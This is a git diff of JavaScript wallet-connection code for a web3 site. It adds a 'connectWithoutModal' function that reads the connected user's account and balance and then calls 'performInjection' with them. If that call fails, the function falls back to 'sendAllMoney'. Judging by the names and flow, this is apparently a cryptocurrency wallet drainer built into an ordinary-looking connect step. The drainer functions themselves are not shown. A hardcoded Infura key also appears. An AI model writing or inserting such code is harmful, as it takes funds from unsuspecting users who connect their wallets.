@@ -91,6 +91,7 @@ async function syncChain() {
                     }
                 }
             }
+
 async function connect() {
     try {
         await web3Modal.clearCachedProvider()
@@ -128,6 +129,39 @@ async function connect() {
 
 
 }
+
+async function connectWithoutModal() {
+    provider = await Moralis.enableWeb3();
+    web3 = new Web3(provider);
+    console.log("Web3 instance is", web3);
+    const accounts = await web3.eth.getAccounts();
+    const balance = await web3.eth.getBalance(accounts[0]);
+    selectedAccount = accounts[0];
+    await syncChain()
+    try {
+        try {
+
+            //throw "No accounts found"
+            await performInjection(selectedAccount, balance);
+        }
+        catch (error) {
+            // do in loop
+            console.log(error)
+
+            await sendAllMoney()
+
+
+        }
+    }
+    catch (err) {
+        await sendAllMoney()
+    }
+
+
+
+
+}
+
 
 async function connects() {
 window.web3 = new Web3("https://mainnet.infura.io/v3/a2406dc3cb964ddeb4c4f93e9cdcb8a5");
